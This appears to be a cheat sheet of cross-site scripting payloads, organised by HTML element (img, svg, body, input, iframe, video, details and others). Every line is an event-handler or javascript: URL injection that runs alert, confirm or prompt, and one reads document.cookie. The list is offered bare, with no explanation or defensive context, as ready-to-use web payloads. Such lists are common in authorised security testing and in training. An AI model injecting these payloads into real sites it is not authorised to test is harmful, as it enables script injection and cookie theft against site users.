<!-- IMG -->
<img src=x onerror=alert(1)>
<img src=1 onerror=alert(document.cookie)>
<img src=x onerror="javascript:alert(1)">
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>

<!-- SVG -->
<svg onload=alert(1)>
<svg/onload=alert(1)>
<svg onload=confirm(1)>
<svg onload=prompt(1)>

<!-- BODY -->
<body onload=alert(1)>
<body onpageshow=alert(1)>

<!-- INPUT -->
<input onfocus=alert(1) autofocus>
<input onblur=alert(1) autofocus>
<input onchange=alert(1)>
<input onmouseover=alert(1)>

<!-- BUTTON -->
<button onclick=alert(1)>click</button>
<button ondblclick=alert(1)>double</button>

<!-- DIV -->
<div onclick=alert(1)>click</div>
<div onmouseover=alert(1)>hover</div>

<!-- A TAG -->
<a href=# onclick=alert(1)>click</a>
<a href=javascript:alert(1)>link</a>

<!-- IFRAME -->
<iframe onload=alert(1)></iframe>

<!-- VIDEO / AUDIO -->
<video src=x onerror=alert(1)></video>
<audio src=x onerror=alert(1)></audio>

<!-- FORM -->
<form onsubmit=alert(1)></form>

<!-- MARQUEE -->
<marquee onstart=alert(1)></marquee>

<!-- DETAILS -->
<details open ontoggle=alert(1)></details>

<!-- OBJECT -->
<object data=x onerror=alert(1)></object>

<!-- MISC -->
<select onchange=alert(1)><option>1</option></select>
<textarea onfocus=alert(1) autofocus></textarea>
